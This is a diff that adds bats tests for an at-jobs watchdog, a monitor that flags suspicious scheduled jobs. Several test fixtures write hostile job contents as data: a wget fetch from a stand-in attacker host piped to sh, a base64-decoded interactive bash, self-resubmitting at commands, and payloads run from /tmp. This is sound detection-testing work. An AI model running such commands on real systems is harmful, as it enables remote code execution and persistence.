@@ -158,3 +158,69 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     cap | grep -q '"event":"module_lib_missing"'
     cap | grep -q '"severity":"alert"'
 }
+
+@test "baseline is chmod 0600 (confidentiality — at-jobs inventory enumerates owner-scheduled exec surface)" {
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (preserved at-resubmit extra — at after semicolon): self-resubmit via ;at" {
+    # The preserved pattern matches at/batch after multiple separators
+    # (; & | \` $( ). Lock that semicolon-prefix form fires.
+    printf '#!/bin/sh\n/usr/bin/work.sh; at now + 1 hour < /root/.relaunch\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (preserved at-resubmit extra — at after pipe): self-resubmit via |at" {
+    printf '#!/bin/sh\necho work | at now + 1 hour\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (wget-pipe-sh in job)" {
+    printf '#!/bin/sh\nwget -qO- http://attacker/p | sh\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (base64-decode-pipe in job)" {
+    printf '#!/bin/sh\necho YmFzaCAtaQ== | base64 -d | bash\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (payload under /tmp): writable-root in command position" {
+    printf '#!/bin/sh\n/tmp/.payload --run\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (payload under /var/tmp): writable-root expansion" {
+    printf '#!/bin/sh\n/var/tmp/.payload --run\n' > "${JOB}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (current-behavior lock — at-jobs-watchdog scans job CONTENT, not the at-job file's own perms; file-mode is owned by world-writable-watchdog)" {
+    # Architectural boundary: at-jobs-watchdog is content-scoped (CONTENT
+    # of the at job is the persistence signal). File-mode coverage lives
+    # in world-writable-watchdog by design.
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    chmod 0666 "${JOB}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    # The at-job content is unchanged → no exec-signal content match
+    # from THIS watchdog. world-writable-watchdog would surface the
+    # file-mode change separately.
+    ! cap | grep -q '"event":"at_jobs_alert_signature"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf '#!/bin/sh\n/usr/bin/backup.sh\n' > "${JOB}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-at-jobs -- ')
+    [ "${main_count}" = "1" ]
+}
